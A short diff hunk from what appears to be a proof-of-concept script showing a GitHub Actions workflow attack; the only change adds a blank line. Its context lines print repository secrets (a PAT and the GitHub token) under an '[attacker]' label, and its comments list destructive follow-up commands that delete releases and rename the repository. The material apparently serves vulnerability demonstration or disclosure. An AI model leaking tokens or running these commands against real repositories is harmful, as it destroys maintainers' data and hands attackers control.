@@ -10,6 +10,7 @@ echo "[attacker] Workflow triggered with base repo permissions"
 echo "[attacker] PAT_TOKEN is: ${PAT_TOKEN}"
 echo "[attacker] GITHUB_TOKEN is: ${GH_TOKEN}"
 
+
 # Step 2: With a real PAT, the attacker would now:
 #   - Delete releases:      gh release delete v0.69.1 --yes
 #   - Rename the repo:      gh api repos/OWNER/REPO -X PATCH -f name=new-name
